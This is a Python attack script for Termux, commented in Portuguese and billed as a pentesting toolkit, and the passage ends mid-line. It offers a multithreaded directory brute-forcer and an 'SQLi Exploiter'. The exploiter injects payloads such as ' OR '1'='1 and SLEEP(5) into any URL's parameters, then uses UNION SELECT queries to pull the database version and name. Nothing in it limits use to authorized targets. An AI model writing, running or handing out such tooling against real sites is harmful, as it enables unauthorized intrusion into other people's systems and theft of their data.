#!/data/data/com.termux/files/usr/bin/python3
# Omega Cyber Suite v5.0 - Ultimate Pentesting Toolkit (Termux Edition)
# Versão Simplificada - Sem aiohttp, paramiko, flask

import os
import sys
import time
import socket
import random
import requests
import re
import threading
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse
from datetime import datetime
from bs4 import BeautifulSoup

# Configurações globais para Termux
MAX_THREADS = 50  # Reduzido para melhor performance no Android
TIMEOUT = 10
USER_AGENTS = [
    'Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1'
]

# Cores para o terminal
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

# Banner otimizado para Termux
def show_banner():
    os.system('clear')
    print(f"""{Colors.PURPLE}
    ██████╗ ███╗   ███╗███████╗ ██████╗  █████╗ 
    ██╔═══██╗████╗ ████║██╔════╝██╔════╝ ██╔══██╗
    ██║   ██║██╔████╔██║█████╗  ██║  ███╗███████║
    ██║   ██║██║╚██╔╝██║██╔══╝  ██║   ██║██╔══██║
    ╚██████╔╝██║ ╚═╝ ██║███████╗╚██████╔╝██║  ██║
     ╚═════╝ ╚═╝     ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝
    {Colors.CYAN}Termux Edition v5.0{Colors.END}
    {Colors.YELLOW}By OMEGA | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.END}
    """)

# Menu principal otimizado
def show_menu():
    print(f"\n{Colors.BOLD}{Colors.BLUE}┌──[{Colors.END}OMEGA{Colors.BOLD}{Colors.BLUE}][{Colors.END}MENU{Colors.BOLD}{Colors.BLUE}]{Colors.END}")
    print(f"{Colors.BOLD}{Colors.BLUE}├─┬─[{Colors.END}Escolha:{Colors.BOLD}{Colors.BLUE}]{Colors.END}")
    print(f"{Colors.BOLD}{Colors.BLUE}│ ├─{Colors.GREEN}[1]{Colors.END} Directory Bruteforce")
    print(f"{Colors.BOLD}{Colors.BLUE}│ ├─{Colors.GREEN}[2]{Colors.END} SQLi Scanner")
    print(f"{Colors.BOLD}{Colors.BLUE}│ └─{Colors.RED}[0]{Colors.END} Sair")
    print(f"{Colors.BOLD}{Colors.BLUE}└───┴───────────────────────{Colors.END}\n")

# ===========================================
# MÓDULO DE BRUTEFORCE DE DIRETÓRIOS (SEM AIOHTTP)
# ===========================================
class DirectoryBruteforcer:
    def __init__(self):
        self.found_dirs = []
    
    def check_directory(self, base_url, directory, status_codes, hide_404):
        url = f"{base_url}/{directory}"
        try:
            headers = {'User-Agent': random.choice(USER_AGENTS)}
            response = requests.get(url, headers=headers, timeout=TIMEOUT, allow_redirects=False)
            
            if not hide_404 or response.status_code != 404:
                color = Colors.GREEN if response.status_code < 400 else Colors.YELLOW
                print(f"{color}[{response.status_code}] {url}{Colors.END}")
            
            if response.status_code in status_codes:
                self.found_dirs.append((url, response.status_code))
            
            return True
        except:
            return False
    
    def start_scan(self, base_url, wordlist_file, extensions, status_codes, threads=20, hide_404=True):
        if not base_url.endswith('/'):
            base_url += '/'
        
        try:
            with open(wordlist_file, 'r', errors='ignore') as f:
                directories = [line.strip() for line in f]
        except:
            print(f"{Colors.RED}[!] Erro ao ler a wordlist!{Colors.END}")
            return []
        
        if extensions:
            new_dirs = []
            for ext in extensions.split(','):
                ext = ext.strip()
                if ext:
                    new_dirs.extend([f"{d}.{ext}" for d in directories if d])
            directories = new_dirs
        
        total = len(directories)
        completed = 0
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            
            for directory in directories:
                if not directory:  # Ignorar linhas vazias
                    continue
                    
                futures.append(
                    executor.submit(
                        self.check_directory, base_url, directory, status_codes, hide_404
                    )
                )
                
                completed += 1
                progress = (completed / total) * 100
                elapsed = time.time() - start_time
                sys.stdout.write(
                    f"\r{Colors.BLUE}[*] Progresso: {completed}/{total} "
                    f"({progress:.2f}%) | Encontrados: {len(self.found_dirs)}{Colors.END}"
                )
                sys.stdout.flush()
            
            for future in futures:
                try:
                    future.result(timeout=TIMEOUT)
                except:
                    pass
        
        print(f"\n{Colors.CYAN}[*] Concluído! Recursos encontrados: {len(self.found_dirs)}{Colors.END}")
        return self.found_dirs

# ===========================================
# MÓDULO DE SQL INJECTION (SEM AIOHTTP)
# ===========================================
class SQLInjectionExploiter:
    PAYLOADS = {
        'error_based': ["'", "' OR '1'='1"],
        'time_based': ["' OR SLEEP(5)--"],
        'boolean_based': ["' OR 1=1--"]
    }
    
    def __init__(self):
        self.vulnerable_params = []
        self.extracted_data = []
    
    def test_url(self, url, params, payload):
        try:
            test_params = params.copy()
            for key in test_params:
                test_params[key] += payload
            
            headers = {'User-Agent': random.choice(USER_AGENTS)}
            response = requests.get(url, params=test_params, headers=headers, timeout=TIMEOUT)
            
            if 'sql' in response.text.lower() or 'syntax' in response.text.lower():
                return 'error_based'
            
            start_time = time.time()
            requests.get(url, params=test_params, headers=headers, timeout=TIMEOUT)
            elapsed = time.time() - start_time
            if elapsed > 4:
                return 'time_based'
                
        except:
            pass
        
        return None
    
    def exploit_param(self, url, param_name, param_value, technique):
        print(f"{Colors.CYAN}[*] Explorando: {param_name}{Colors.END}")
        
        if technique in ['error_based', 'boolean_based']:
            headers = {'User-Agent': random.choice(USER_AGENTS)}
            payload = f"' UNION SELECT NULL,@@version,NULL--"
            response = requests.get(url, params={param_name: param_value + payload}, headers=headers, timeout=TIMEOUT)
            
            version_match = re.search(r'(\d+\.\d+\.\d+)-[A-Za-z0-9]+', response.text)
            if version_match:
                version = version_match.group(1)
                print(f"{Colors.GREEN}[+] Versão DB: {version}{Colors.END}")
                self.extracted_data.append(('Versão DB', version))
            
            payload = f"' UNION SELECT NULL,database(),NULL--"
            response = requests.get(url, params={param_name: param_value + payload}, headers=headers, timeout=TIMEOUT)
            db_name_match = re.search(r'([a-zA-Z_][a-zA-Z0-9_]{3,})', response.text)
            if db_name_match:
                db_name = db_name_match.group(1)
                print(f"{Colors.GREEN}[+] Banco de dados: {db_name}{Colors.END}")
                self.extracted_data.append(('Banco de dados', db_name))
        
        return True
    
    def scan_url(self, url):
        parsed_url = urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        
        params = {}
        for param in parsed_url.query.split('&'):
            if '=' in param:
                key, value = param.split('=', 1)
                params[key] = value
        
        print(f"{Colors.CYAN}[*] Scan SQLi em {url}{Colors.END}")
        
        for param_name, param_value in params.items():
            print(f"{Colors.BLUE}[*] Testando: {param_name}{Colors.END}")
            
            for technique, payloads in self.PAYLOADS.items():
                for payload in payloads:
                    vuln_type = self.test_url(base_url, {param_name: param_value}, payload)
                    if vuln_type:
                        print(f"{Colors.GREEN}[+] Vulnerável: {param_name} ({technique}){Colors.END}")
                        self.vulnerable_params.append((param_name, technique))
                        self.exploit_param(base_url, param_name, param_value, technique)
                        break
        
        if not self.vulnerable_params:
            print(f"{Colors.RED}[-] Nenhuma vulnerabilidade SQLi encontrada{Colors.END}")
        
        return self.vulnerable_params, self.extracted_data

# ===========================================
# FUNÇÕES PRINCIPAIS
# ===========================================
def directory_bruteforce_tool():
    show_banner()
    print(f"{Colors.RED}{Colors.BOLD}╔══════════════════╗")
    print(f"║  DIR BRUTEFORCE ║")
    print(f"╚══════════════════╝{Colors.END}")
    
    dbf = DirectoryBruteforcer()
    
    url = input(f"\n{Colors.YELLOW}[?] URL alvo: {Colors.END}")
    if not url.startswith('http'):
        url = 'http://' + url
    
    wordlist = input(f"{Colors.YELLOW}[?] Wordlist (padrão: common.txt): {Colors.END}") or "common.txt"
    
    if not os.path.exists(wordlist):
        print(f"{Colors.RED}[!] Wordlist não encontrada!{Colors.END}")
        input(f"{Colors.YELLOW}[Enter para voltar]{Colors.END}")
        return
    
    extensions = input(f"{Colors.YELLOW}[?] Extensões (ex: php,html): {Colors.END}")
    status_codes = [int(c) for c in input(f"{Colors.YELLOW}[?] Códigos HTTP (200,301,302): {Colors.END}") or "200,301,302".split(',')]
    threads = min(int(input(f"{Colors.YELLOW}[?] Threads (max {MAX_THREADS}): {Colors.END}") or 20), MAX_THREADS)
    hide_404 = input(f"{Colors.YELLOW}[?] Ocultar 404? (s/n): {Colors.END}").lower() == 's'
    
    print(f"\n{Colors.CYAN}[*] Iniciando brute force em {url}...{Colors.END}")
    found_dirs = dbf.start_scan(url, wordlist, extensions, status_codes, threads, hide_404)
    
    if found_dirs:
        print(f"\n{Colors.GREEN}{Colors.BOLD}╔══════════════════╗")
        print(f"║  RECURSOS ENCONTRADOS ║")
        print(f"╚══════════════════╝{Colors.END}")
        for i, (path, code) in enumerate(found_dirs, 1):
            color = Colors.GREEN if code < 400 else Colors.YELLOW
            print(f"{color}{i}. [{code}] {path}{Colors.END}")
    
    input(f"\n{Colors.YELLOW}[Enter para voltar]{Colors.END}")

def sql_injection_tool():
    show_banner()
    print(f"{Colors.RED}{Colors.BOLD}╔══════════════════╗")
    print(f"║  SQLi EXPLOITER ║")
    print(f"╚══════════════════╝{Colors.END}")
    
    sqli = SQLInjectionExploiter()
    
    url = input(f"\n{Colors.YELLOW}[?] URL (com parâmetros): {Colors.END}")
    if not url.startswith('http'):
        url = 'http://' + url
    
    print(f"\n{Colors.CYAN}[*] Iniciando scan SQLi...{Colors.END}")
    vulnerable_params, extracted_data = sqli.scan_url(url)
    
    if vulnerable_params:
        print(f"\n{Colors.GREEN}{Colors.BOLD}╔══════════════════╗")
        print(f"║  VULNERABILIDADES ║")
        print(f"╚══════════════════╝{Colors.END}")
        for i, (param, technique) in enumerate(vulnerable_params, 1):
            print(f"{Colors.GREEN}{i}. Parâmetro: {param} ({technique}){Colors.END}")
        
        if extracted_data:
            print(f"\n{Colors.GREEN}{Colors.BOLD}╔══════════════════╗")
            print(f"║  DADOS EXTRAÍDOS ║")
            print(f"╚══════════════════╝{Colors.END}")
            for i, (data_type, value) in enumerate(extracted_data, 1):
                print(f"{Colors.GREEN}{i}. {data_type}: {value}{Colors.END}")
    
    input(f"\n{Colors.YELLOW}[Enter
